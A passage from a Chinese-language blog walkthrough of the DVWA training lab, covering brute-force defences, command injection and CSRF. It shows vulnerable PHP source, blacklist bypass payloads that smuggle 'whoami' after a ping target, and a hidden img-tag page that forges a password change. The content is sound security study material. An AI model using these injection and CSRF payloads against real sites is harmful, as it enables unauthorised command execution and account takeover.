class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做了可靠的爆破机制：</p><p>30-38: 如果三次登录失败，就锁定15分钟，避免了无限制爆破。</p><p>每一步的数据库操作，都做了SQL语句的预处理，使用<code>PDO(Php Data Object)</code>防御SQL注入。</p><blockquote><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。</p><p><a href="https://blog.csdn.net/qq_28602957/article/details/51004241">PDO防止sql注入的机制</a></p></blockquote><h1 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h1><p>命令注入，一般在通过php进行系统接口调用的时候容易出现。</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stristr — <a href="https://www.php.net/manual/zh/function.strstr.php">strstr()</a> 函数的忽略大小写版本</p><p>stristr ( string <code>$haystack</code> , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$needle</code> [, bool <code>$before_needle</code> = <strong><code>FALSE</code></strong> ] ) : string</p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。</p></blockquote><p><code>php_uname</code>返回系统信息。这两个函数只是判断一下系统，关键在于<code>shell_exec()</code>函数，直接接受<code>$ip</code>作为参数，没有任何过滤和检查，完全信任用户输入，可以直接<code>&amp;&amp; cmd</code>执行命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/VG8oyqiY1JM6hNB.png"></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>增加了简单的黑名单过滤，将<code>&amp;&amp;和;</code>替换成空值，但是明显是很容易绕过的。比如用&amp;或者双写绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line">   $substitutions = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">   $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; whoami</span><br><span class="line">127.0.0.1 &amp;;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/NYbyJXsAO7fQT82.png"></p><p>这里使用一个<code>&amp;</code>来绕过，但是<code>&amp;&amp;</code>和<code>&amp;</code>是有区别的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd1 &amp;&amp; cmd2cmd1执行成功，再执行cmd2，否则不执行cmd2</span><br><span class="line">cmd1 &amp; cmd2cmd1和cmd2都要执行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;ping 12345 &amp;&amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line"></span><br><span class="line">C:\Users\DELL&gt;ping 12345 &amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line">desktop-iknkost\dell</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure><p>扩大了黑名单的范围，用<code>trim</code>去除字符串尾部的空白字符或者换行符等。</p><p>这里只过滤的<code>| </code>（|后面一个空格），但是还存在<code> |</code>（|前面有一个空格）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 |whoami</span><br><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><blockquote><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p></blockquote><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">&quot;.&quot;</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>stripslashes(string)</code></p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><code>explode(separator,string,limit)</code></p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p></blockquote><p>通过<code>.</code>分割IP，然后判断IP每个部分是否是数字，不是就报错。防御住命令注入。</p><h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><blockquote><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p></blockquote><p>说实话，都快忘光了。</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制。</p><p>也就是说，以任何方式欺骗受害者点击这个链接或者伪装成别的样子的这个链接，都会导致用户密码更改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><p>常见的伪装方式：</p><ol><li><p><strong>短链接来隐藏url</strong></p><p>需要注意的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。</p><p><img src="https://i.loli.net/2020/03/01/W3GVqpayDh259od.png"></p></li><li><p><strong>精心构造攻击页面</strong></p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;192.168.153.130&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;hack&amp;password_conf&#x3D;hack&amp;Change&#x3D;Change#&quot; border&#x3D;&quot;0&quot; style&#x3D;&quot;display:none;&quot;&#x2F;&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问<code>test.html</code>时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。而原来的密码password就登不上去了。</p><p><img src="https://i.loli.net/2020/03/01/iX4bgD3yxpfESTI.png"></p></li></ol><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stripos( <code>$string</code> ,<code>$pattern</code>)</p><p>string中pattern的位置，如果有返回位置序号，反之False。</p></blockquote><p>可以看到，Medium级别的代码检查了保留变量 